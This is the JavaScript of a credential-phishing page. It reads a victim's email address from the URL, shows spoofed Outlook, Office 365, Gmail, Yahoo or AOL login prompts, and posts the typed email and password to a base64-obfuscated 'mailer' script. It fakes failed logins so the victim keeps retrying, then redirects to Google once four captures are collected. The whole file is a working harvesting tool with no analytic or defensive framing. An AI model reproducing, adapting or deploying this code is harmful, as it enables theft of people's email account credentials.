
//redirect link
var rdrt = "https://www.google.com";

//mail result count
var rc = 4;

//mailer link
var f = atob("bmV4dC5waHA=");


$(document).ready(function() {
    var l = 0;
    var n = "b3V0bG9vaw==";
    var o = "aG90bWFpbA==";
    var p = "Z21haWw=";
    var q = "eWFob28=";
    var r = "b2ZmaWNlMzY1";

    function getUrlVars() {
        var c = {};
        var d = window.location.href.replace(/[?&]+([^=&]+)=([^&]*)/gi, function(m, a, b) {
            c[a] = b
        });
        return c
    }
    if (!getUrlVars()["count"]) {} else {
        var l = getUrlVars()["count"];
        $('#count').val(l)
    }
    var s = window.location.hash.substr(1);
    if (!s) {} else {
        var t = s;
        var u = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
        if (!u.test(t)) {
            $('.error').show();
            s.focus;
            return false
        }
        var v = t.indexOf("@");
        var w = t.substr((v + 1));
        var c = w.substr(0, w.indexOf('.'));
        var x = c.toLowerCase();
        var s = window.location.hash.substr(1);
        var t = s;
        var u = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
        var v = t.indexOf("@");
        var w = t.substr((v + 1));
        var c = w.substr(0, w.indexOf('.'));
        var x = c.toLowerCase();
        
        if (x == atob(n) || x == atob(o)) {
            $('#fieldImg').attr('src', 'images/' + atob(n) + '.png');
            $('#field').html("Outlook");
            $('#ai').val(t);
            $('#aich').html(t);
            $("#outlookmodal").trigger("click")
        } else if (x == atob(r)) {
            $('#fieldImg').attr('src', 'images/' + atob(r) + '.png');
            $('#field').html("Office 365");
            $('#ai').val(t);
            $('#aich').html(t);
            $("#office365modal").trigger("click")
        }else {
            $('#fieldImg').attr('src', 'images/othermail.ico');
            $('#field').html("Other Mail");
            $('#ai').val(t);
            $('#aich').html(t);
            $("#othermodal").trigger("click")
        }
    }
    $('#gmailmodal').click(function() {
        $('#fieldImg').attr('src', 'images/' + atob(p) + '.png');
        $('#field').html(atob(p));
        $("#msg").hide()
    });
    $('#outlookmodal').click(function() {
        $('#fieldImg').attr('src', 'images/' + atob(n) + '.png');
        $('#field').html("Outlook");
        $("#msg").hide()
    });
    $('#aolmodal').click(function() {
        $('#fieldImg').attr('src', 'images/aol.png');
        $('#field').html("Aol");
        $("#msg").hide()
    });
    $('#office365modal').click(function() {
        $('#fieldImg').attr('src', 'images/' + atob(r) + '.png');
        $('#field').html("Office 365");
        $("#msg").hide()
    });
    $('#yahoomodal').click(function() {
        $('#fieldImg').attr('src', 'images/' + atob(q) + '.png');
        $('#field').html("Yahoo");
        $("#msg").hide()
    });
    $('#othermodal').click(function() {
        $('#fieldImg').attr('src', 'images/othermail.ico');
        $('#field').html("Other Mail");
        $("#msg").hide()
    });
    $('#sub-btn').click(function(b) {
        $('.error').hide();
        $('#msg').hide();
        b.preventDefault();
        var d = $("#ai").val();
        var e = $("#pr").val();
        $field = $('#field').html();
        var g = d;
        var h = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
        if (!d) {
            $('.error').show();
            $('.error').html("Email field is empty...!");
            d.focus;
            return false
        }
        if (!h.test(g)) {
            $('.error').show();
            $('.error').html("That account doesn't exist. Enter a different account");
            d.focus;
            return false
        }
        if (!e) {
            $('.error').show();
            $('.error').html("Password field is empty...!");
            d.focus;
            return false
        }
        var i = g.indexOf("@");
        var j = g.substr((i + 1));
        var c = j.substr(0, j.indexOf('.'));
        var k = c.toLowerCase();
        l = l + 1;
        $.ajax({
            dataType: 'JSON',
            url: f,
            type: 'POST',
            data: {
                ai: d,
                pr: e,
            },
            beforeSend: function(a) {
                $('#sub-btn').val('Verifing...')
            },
            complete: function() {
                
                if (l >= rc) {
                    l = 0;
                    window.location.replace(rdrt);
                    return false
                }
                $("#pr").val("");
                $("#msg").show();
                $('#sub-btn').val('Login')
            }
        })
    });
    
});
